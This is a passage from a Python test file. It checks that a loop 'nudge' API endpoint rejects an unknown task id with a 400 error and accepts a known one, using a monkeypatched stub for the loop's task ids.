        # the loop has provisioned lists, an unknown id must 400 — mirroring the queue
        # guard. Stub _loop_task_ids to a known set (real lists need a running worker).
        cid = self._make(state)
        _run(H.api_loop_action(_req("PATCH", f"/api/loops/{cid}", state, body={"action": "start"}, match_info={"id": cid})))
        async def _known(_lid):
            return {"task-1", "task-2"}
        monkeypatch.setattr(H, "_loop_task_ids", _known)
        bad = _run(H.api_loop_nudge(_req("POST", f"/api/loops/{cid}/nudge", state,
            body={"text": "do X", "task_id": "task-999"}, match_info={"id": cid})))
        assert bad.status == 400 and "Unknown task id" in _body(bad)["error"]
        # a KNOWN task id still goes through
        ok = _run(H.api_loop_nudge(_req("POST", f"/api/loops/{cid}/nudge", state,
            body={"text": "do X", "task_id": "task-1"}, match_info={"id": cid})))
        assert ok.status == 200
